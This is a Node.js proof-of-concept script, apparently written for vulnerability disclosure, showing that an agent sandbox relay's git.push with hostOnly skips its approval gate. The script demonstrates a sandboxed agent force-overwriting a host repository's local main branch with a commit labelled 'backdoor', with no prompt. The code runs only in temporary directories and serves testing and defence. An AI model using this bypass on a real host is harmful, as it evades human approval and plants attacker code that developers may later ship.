#!/usr/bin/env node
//
// PoC: `git.push --host-only` force-overwrites arbitrary host local branches
// ---------------------------------------------------------------------------
// The relay's git.push handler short-circuits the confirm/host-initiated gate
// whenever params.hostOnly is set ("landing publishes nothing"):
//
//   // packages/relay/src/host-actions.ts:1136-1162  (cloud runGitRpc)
//   if (params.hostOnly) {
//     const dest = resolveLandDest(branch, params.as);          // box-controlled `as`
//     const refspec = landRefspec(branch, dest, params.force);  // box-controlled `force`
//     await execa('git', ['-C', hostWorkspace, 'fetch', hostBundleSave, refspec]);  // NO gate
//   }
//
// On the cloud path `branch` is the box's current HEAD (agent-controlled), and
// `as`/`force` are box-controlled, so a box lands ANY box-authored commits onto
// ANY non-checked-out host local branch (e.g. main) with no approval prompt.
// git ref validation blocks path traversal, so this is a branch-ref rewrite, not
// arbitrary file write -- but poisoning local `main` means the dev may later push
// or build attacker code.
//
// This PoC uses the REAL refspec builders from @agentbox/core and reproduces the
// exact `git fetch <bundle> <refspec>` the handler runs.
//
// Run: node poc.mjs   (needs `pnpm --filter @agentbox/core build`)

import { landRefspec, resolveLandDest } from '../../../packages/core/dist/index.js';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const red = (s) => `\x1b[1;31m${s}\x1b[0m`;
const green = (s) => `\x1b[1;32m${s}\x1b[0m`;
const say = (s) => console.log(`\n${bold('== ' + s + ' ==')}`);
const info = (s) => console.log('   ' + s);

const WORK = mkdtempSync(join(tmpdir(), 'agentbox-clobber-poc.'));
const HOST = join(WORK, 'host-repo');
const BOX = join(WORK, 'box-repo');
const g = (repo, args) => execFileSync('git', ['-C', repo, ...args], { encoding: 'utf8' }).trim();
const gi = (repo, args) => execFileSync('git', ['-C', repo, ...args], { encoding: 'utf8', stdio: ['ignore','pipe','pipe'] }).trim();

function initRepo(dir) {
  execFileSync('mkdir', ['-p', dir]);
  g(dir, ['init', '-q', '-b', 'main']);
  g(dir, ['config', 'user.email', 'a@b.c']); g(dir, ['config', 'user.name', 'a']);
}

async function main() {
  say('1. Host repo: main has the developer\'s real work; developer is on another branch');
  initRepo(HOST);
  writeFileSync(join(HOST, 'app.js'), 'console.log("legit host code")\n');
  g(HOST, ['add', '.']); g(HOST, ['-c', 'core.hooksPath=/dev/null', 'commit', '-qm', 'real work on main']);
  const mainBefore = g(HOST, ['rev-parse', 'main']);
  g(HOST, ['checkout', '-q', '-b', 'feature']); // main is now NOT the checked-out branch
  info(`host main = ${mainBefore.slice(0, 10)} ("real work on main"); checked-out branch = feature`);

  say('2. Box authors malicious commits on its own HEAD (the agent controls box content)');
  initRepo(BOX);
  g(BOX, ['fetch', HOST, 'main']); // start from the host's main so the fetch is a fast-forward-able history
  g(BOX, ['checkout', '-q', '-b', 'poison', 'FETCH_HEAD']);
  writeFileSync(join(BOX, 'app.js'), 'console.log("ATTACKER CODE")\n');
  g(BOX, ['add', '.']); g(BOX, ['-c', 'core.hooksPath=/dev/null', 'commit', '-qm', 'backdoor']);
  const boxTip = g(BOX, ['rev-parse', 'poison']);
  const bundle = join(WORK, 'box.bundle');       // the relay downloads the box's branch as a bundle
  g(BOX, ['bundle', 'create', bundle, 'poison']);
  info(`box poison tip = ${boxTip.slice(0, 10)} ("backdoor"), bundled for the host`);

  say('3. Box sends /rpc git.push {hostOnly:true, as:"main", force:true} -- the REAL refspec builders');
  const branch = 'poison';            // == box HEAD on the cloud path
  const dest = resolveLandDest(branch, 'main');          // box-controlled `as`
  const refspec = landRefspec(branch, dest, true);       // box-controlled `force`
  info(`resolveLandDest("poison","main") = ${JSON.stringify(dest)}`);
  info(`landRefspec("poison","main",force=true) = ${JSON.stringify(refspec)}`);
  info('handler runs (NO approval prompt, hostOnly short-circuits the gate):');
  info(`  git -C <hostWorkspace> fetch <box.bundle> ${refspec}`);
  gi(HOST, ['fetch', bundle, refspec]);

  say('4. Result');
  const mainAfter = g(HOST, ['rev-parse', 'main']);
  const nowMsg = g(HOST, ['log', '-1', '--format=%s', 'main']);
  info(`host main was ${mainBefore.slice(0, 10)} -> now ${mainAfter.slice(0, 10)} ("${nowMsg}")`);
  const ok = mainAfter === boxTip && nowMsg === 'backdoor';
  if (ok) {
    console.log('\n' + red('VULNERABLE') + ' -- a box force-overwrote the host repo\'s local `main` to attacker commits,');
    info('with no approval prompt. If the developer later `git push origin main` or builds from local');
    info('main, they ship the attacker code. (Cloud path: `branch` is the box\'s own HEAD.)');
  } else {
    console.log('\n' + green('NOT reproduced'));
  }
  rmSync(WORK, { recursive: true, force: true });
  process.exit(ok ? 0 : 1);
}
main().catch((e) => { console.error(e.message || e); rmSync(WORK, { recursive: true, force: true }); process.exit(2); });
